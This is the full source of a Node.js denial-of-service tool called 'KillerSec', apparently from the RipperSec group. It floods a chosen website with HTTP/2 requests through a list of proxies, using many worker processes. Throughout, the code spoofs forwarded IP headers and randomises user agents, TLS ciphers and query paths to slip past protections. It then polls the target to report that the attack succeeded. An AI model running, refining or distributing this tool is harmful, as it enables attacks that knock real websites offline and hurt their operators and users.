const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
const axios = require("axios");
const https = require("https");
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x47c36d) {});
if (process.argv.length < 0x7) {
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m█─▄▀ ─▄ sparkle █── █── █▀▀ █▀▀█ █▀▀ ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m█▀▄─ ░█── █── █▀▀ █── ▀▀█ █▀▀ ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m▀─▀▀ ▀▀▀─ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m  █─█ ░█─▀ █── █── █▀▀ █▀▀█ █▀▀ ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m     ╚═════╦════════════════════════════════════════════╦═════╝   ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ║            [0mAuthor : [31m! D a r k n e s x z    [0;33m║  ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ║   [0mStatus : [32mOnline                         [0;33m║  ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ║     [0mTelegram : [32mhttps://t.me/RipperSec      [0;33m║  ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ╚════════════════════════════════════════════╝");
  }
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m node[1m[33m KillerSec [1m[32m<HOST> <TIME> <RPS> <THREADS> <PROXY>.");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m Made by [1m[31m! D a r k n e s x z");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m Update your proxy every 1 week :[1m[33m node scraper.js[1m[0m");
  }
  process.exit();
}
const headers = {};
function readLines(_0x30e4bb) {
  return fs.readFileSync(_0x30e4bb, "utf-8").toString().split(/\r?\n/);
}
const targetURL = process.argv[0x2];
const agent = new https.Agent({
  'rejectUnauthorized': false
});
function getStatus() {
  const _0x294da9 = new Promise((_0x461c75, _0x53ba3f) => {
    setTimeout(() => {
      _0x53ba3f(new Error("[31mRequest timed out"));
    }, 0x1388);
  });
  const _0xda1990 = axios.get(targetURL, {
    'httpsAgent': agent
  });
  Promise.race([_0xda1990, _0x294da9]).then(_0x2bfee9 => {
    const {
      status: _0x146dfc,
      data: _0xf79f72
    } = _0x2bfee9;
    console.log("[31m[[33mKillerSec[31m] [32m-> [31m(" + (Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100)) + "[31m) [33m/[0m " + getTitleFromHTML(_0xf79f72) + " ([32m" + _0x146dfc + "[0m)");
  })["catch"](_0x423d5f => {
    if (_0x423d5f.message === "[31mRequest timed out[0m") {
      console.log("[31m[[33mKillerSec[31m] [32m-> [31m(" + (Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100)) + "[31m) [33m/[0m [33mRequest Timed Out[0m");
    } else {
      if (_0x423d5f.response) {
        const _0x441787 = getTitleFromHTML(_0x423d5f.response.data);
        console.log("[31m[[33mKillerSec[31m] [32m-> [31m(" + (Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100)) + "[31m) [33m/[0m " + _0x441787 + " ([31m" + _0x423d5f.response.status + "[0m)");
      } else {
        console.log("[31m[[33mKillerSec[31m] [32m-> [31m" + _0x423d5f.message + " [0m");
      }
    }
  });
}
function getTitleFromHTML(_0x1b1776) {
  const _0x212660 = /<title>(.*?)<\/title>/i;
  const _0x349bb4 = _0x1b1776.match(_0x212660);
  if (_0x349bb4 && _0x349bb4[0x1]) {
    return _0x349bb4[0x1];
  }
  return "Not Found";
}
function randomIntn(_0x133e90, _0x4b31b3) {
  return Math.floor(Math.random() * (_0x4b31b3 - _0x133e90) + _0x133e90);
}
function randstr(_0x19c529) {
  var _0x1d7fd0 = '';
  var _0x1c590f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (var _0x237624 = 0x0; _0x237624 < _0x19c529; _0x237624++) {
    _0x1d7fd0 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x1c590f));
  }
  return _0x1d7fd0;
}
function randayat(_0x53f0e2) {
  var _0x47fd37 = '';
  var _0x255d25 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.length;
  for (var _0x3731f8 = 0x0; _0x3731f8 < _0x53f0e2; _0x3731f8++) {
    _0x47fd37 += 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.charAt(Math.floor(Math.random() * _0x255d25));
  }
  return _0x47fd37;
}
function randnombor(_0x4e658f) {
  var _0x1a0a78 = '';
  var _0x17d80d = "0123456789".length;
  for (var _0x59551c = 0x0; _0x59551c < _0x4e658f; _0x59551c++) {
    _0x1a0a78 += "0123456789".charAt(Math.floor(Math.random() * _0x17d80d));
  }
  return _0x1a0a78;
}
function randomElement(_0x4e9686) {
  return _0x4e9686[Math.floor(Math.random() * (_0x4e9686.length - 0x0) + 0x0)];
}
const ip_spoof = () => {
  return Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100);
};
const spoofed = Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100) + '.' + Math.floor(Math.random() * 0x100);
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5],
  'proxyFile': process.argv[0x6]
};
const os = require('os');
function getRandomHeapSize() {
  return Math.floor(Math.random() * 1537) + 0x200;
}
if (cluster.isMaster) {
  console.clear();
  console.log('');
  console.log("[0m ░█─▄▀ ░█── ░█── ░█▀▀ ░█▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ ");
  console.log("[0m ░█▀▄─ ░█── ░█── ░█▀▀ ░█░█░█ █▀▀ █──█ █──█ ▀▀█ █▄▄█  ");
  console.log("[0m ░█──░█ ▀▀▀ ▀▀▀▀ ▀──▀ ░█──░█ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ V3.2 ");
  console.log("[33m--------------------------------------------");
  console.log("[31m-> [0mTarget[33m ⚡️ : [32m" + process.argv[0x2]);
  console.log("[31m-> [0mTime[33m ⏳ : [32m" + process.argv[0x3]);
  console.log("[31m-> [0mRate[33m 💣 : [32m" + process.argv[0x4]);
  console.log("[31m-> [0mThread[33m ⚙️  : [32m" + process.argv[0x5]);
  console.log("[31m-> [0mProxyFile[33m 🗃 : [32m" + process.argv[0x6]);
  console.log("[33m--------------------------------------------");
  console.log("[31m-> [0mAuthor[33m 🗂 : [32m! D a r k n e s x z");
  console.log("[31m-> [0mCheck-Host[33m 🗂 :  [32mhttps://check-host.net/check-http?host=" + process.argv[0x2]);
  console.log("[33m--------------------------------------------");
  const restartScript = () => {
    console.log("[>] Restarting the script", 0x3e8, 'ms...');
    for (const _0x118c65 in cluster.workers) {
      cluster.workers[_0x118c65].kill();
    }
    setTimeout(() => {
      for (let _0x52a2a0 = 0x1; _0x52a2a0 <= process.argv[0x5]; _0x52a2a0++) {
        const _0x233572 = Math.floor(Math.random() * 1537) + 0x200;
        cluster.fork({
          'NODE_OPTIONS': '--max-old-space-size=' + _0x233572
        });
      }
    }, 0x3e8);
  };
  const handleRAMUsage = () => {
    const _0x275040 = os.totalmem();
    const _0x655985 = _0x275040 - os.freemem();
    const _0x3740fb = _0x655985 / _0x275040 * 0x64;
    if (_0x3740fb >= 0x55) {
      console.log("[!] Maximum RAM usage:", _0x3740fb.toFixed(0x2), '%');
      restartScript();
    }
  };
  setInterval(handleRAMUsage, 0x1388);
  for (let i = 0x1; i <= process.argv[0x5]; i++) {
    const heapSize = Math.floor(Math.random() * 1537) + 0x200;
    cluster.fork({
      'NODE_OPTIONS': "--max-old-space-size=" + heapSize
    });
    console.log("[31m[[33mKillerSec[31m] [32m-> [0mEngine [31m" + i + " [0mStarted");
  }
  console.log("[31m[[33mKillerSec[31m] [32m-> [33mKillerSec Attacking...");
  setInterval(getStatus, 0x7d0);
  setTimeout(() => {
    console.log("[31m[[33mKillerSec[31m] [32m-> [33mAttack Successful ✅[0m");
    process.exit(0x1);
  }, process.argv[0x3] * 0x3e8);
} else {
  setInterval(runFlooder, 0x1);
}
const sig = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", 'ecdsa_secp521r1_sha512', "rsa_pss_rsae_sha256", 'rsa_pss_rsae_sha384', "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
const pathts = ["?s=", '/?', '', "?q=", '?true=', '?', '/', "/.lsrecap/recaptcha?", ".lsrecap/recaptcha?", "?page=1", "?page=2", '?page=3', '?category=news', "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04"];
const cplist = ["ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", 'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES'];
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"];
const lang_header = ['ko-KR', "en-US", "zh-CN", 'pt-BR', "ja-JP", "en-GB"];
const encoding_header = ["gzip, deflate, br", "gzip, deflate, br, zstd", "compress, gzip", "deflate, gzip"];
const control_header = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "no-cache, no-store, must-revalidate"];
const refers = ["https://google.com/", "https://check-host.net/", "https://facebook.com/", "https://t.me/RipperSec"];
const userAgents = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"];
const Methods = ['GET', "HEAD", "POST", "PUT", 'DELETE', "OPTIONS"];
const queryString = ['', '&', '?', '&&', '='];
const useragentl = ["(KillerSec 2_0)", "(BraveBrowser 5_0)", "(ChromeBrowser 3_0)", "(ChromiumBrowser 4_0)"];
const mozilla = ["Mozilla/5.0 ", "Mozilla/6.0 "];
const platform = ['Windows', 'Macintosh', "Linux", 'Android', "iOS"];
const version = ["\"Chromium\";v=\"121\", \"Google Chrome\";v=\"121\"", "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\""];
const browsers = ["Google Chrome", "Firefox", 'Safari', "Opera"];
const sechuas = ['Android', "Chrome OS", "Linux", 'macOS', "Windows"];

var RipperSec = Methods[Math.floor(Math.random() * Methods.length)];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var siga = sig[Math.floor(Math.random() * sig.length)];
var platform1 = platform[Math.floor(Math.random() * platform.length)];
var versi = version[Math.floor(Math.random() * version.length)];
var uap1 = userAgents[Math.floor(Math.random() * userAgents.length)];
var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
var moz = mozilla[Math.floor(Math.random() * mozilla.length)];
var az1 = useragentl[Math.floor(Math.random() * useragentl.length)];
var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
var control = control_header[Math.floor(Math.random() * control_header.length)];
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);

class NetSocket {
  constructor() {}
  async ["HTTP"](_0x2b81f2, _0x5de5b9) {
    if (typeof _0x2b81f2 !== "object" || _0x2b81f2 === null || typeof _0x5de5b9 !== "function") {
      return _0x5de5b9(undefined, "error: invalid arguments");
    }
    const { address: _0x4b9cf3, host: _0xc249cb, port: _0x1b59e4, timeout: _0x27f06f } = _0x2b81f2;
    if (!_0x4b9cf3 || !_0xc249cb || !_0x1b59e4 || _0x27f06f <= 0x0) {
      return _0x5de5b9(undefined, "error: missing or invalid options");
    }
    const _0x270d29 = _0x4b9cf3.split(':');
    const _0x5abb16 = parseInt(_0x270d29[0x1] || "443", 0xa);
    const _0x39cb35 = "CONNECT " + _0x4b9cf3 + " HTTP/1.1\r\nHost: " + _0x4b9cf3 + "\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x2a4e7f = Buffer.from(_0x39cb35);
    return new Promise((_0x19b0f6, _0x54f15d) => {
      const _0x2e7c9d = net.connect({ 'host': _0xc249cb, 'port': _0x1b59e4 });
      _0x2e7c9d.setTimeout(_0x27f06f * 0x3e8);
      _0x2e7c9d.setKeepAlive(true, 0x186a0);
      _0x2e7c9d.on('connect', () => { _0x2e7c9d.write(_0x2a4e7f); });
      _0x2e7c9d.on("data", _0x92b3b4 => {
        const _0x24e6f1 = _0x92b3b4.toString("utf-8");
        if (!_0x24e6f1.includes("HTTP/1.1 200")) {
          _0x2e7c9d.destroy();
          _0x54f15d(new Error("error: invalid response from proxy server"));
        } else { _0x19b0f6(_0x2e7c9d); }
      });
      _0x2e7c9d.on("timeout", () => { _0x2e7c9d.destroy(); _0x54f15d(new Error("error: timeout exceeded")); });
      _0x2e7c9d.on('error', _0x96659a => { _0x2e7c9d.destroy(); _0x54f15d(_0x96659a); });
    }).then(_0x498034 => _0x5de5b9(_0x498034, undefined))["catch"](_0x524e00 => _0x5de5b9(undefined, _0x524e00.message));
  }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + (pathts[Math.floor(Math.random() * pathts.length)] || "") + '&' + randstr(0xa);
headers[":scheme"] = "https";
headers['x-forwarded-proto'] = "https";
headers["cache-control"] = control;
headers["X-Forwarded-For"] = spoofed;
headers["sec-ch-ua"] = "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"";
headers['sec-ch-ua-mobile'] = sechuas[Math.floor(Math.random() * sechuas.length)];
headers['sec-ch-ua-platform'] = platform1;
headers["accept-language"] = lang;
headers['accept-encoding'] = encoding;
headers["upgrade-insecure-requests"] = "1";
headers.Connection = 'keep-alive';
headers.accept = accept;
headers["sec-fetch-mode"] = "navigate";
headers['sec-fetch-dest'] = "document";
headers["sec-fetch-user"] = '?1';
headers.Referer = randomReferer;

function runFlooder() {
  const _0x24c050 = proxies[Math.floor(Math.random() * proxies.length)];
  if (!_0x24c050) return;
  const _0x29db07 = _0x24c050.split(':');
  headers.origin = 'https://' + parsedTarget.host;
  headers["user-agent"] = moz + az1 + uap1;
  const _0xbaea85 = {
    'host': _0x29db07[0x0],
    'port': ~~_0x29db07[0x1],
    'address': parsedTarget.host + ':443',
    'timeout': 0x64
  };
  Socker.HTTP(_0xbaea85, (_0x321689, _0x24fd8f) => {
    if (_0x24fd8f || !_0x321689) return;
    _0x321689.setKeepAlive(true, 0x927c0);
    const _0x3c1435 = {
      'host': parsedTarget.host,
      'port': 443,
      'secure': true,
      'ALPNProtocols': ['h2', 'http/1.1'],
      'socket': _0x321689,
      'ciphers': tls.getCiphers().join(':') + cipper,
      'rejectUnauthorized': false,
      'servername': parsedTarget.host
    };
    const _0x8d4e8a = tls.connect(443, parsedTarget.host, _0x3c1435);
    _0x8d4e8a.setKeepAlive(true, 0xea60);
    const _0x1e0434 = http2.connect(parsedTarget.href, {
      'createConnection': () => _0x8d4e8a,
      'settings': { 'enablePush': false }
    });
    _0x1e0434.on("error", () => { _0x1e0434.destroy(); _0x321689.destroy(); });
    _0x1e0434.on("close", () => { _0x1e0434.destroy(); _0x321689.destroy(); });
    const req = _0x1e0434.request(headers);
    req.end();
  });
}
const StopScript = () => process.exit(0x1);
setTimeout(StopScript, args.time * 0x3e8);
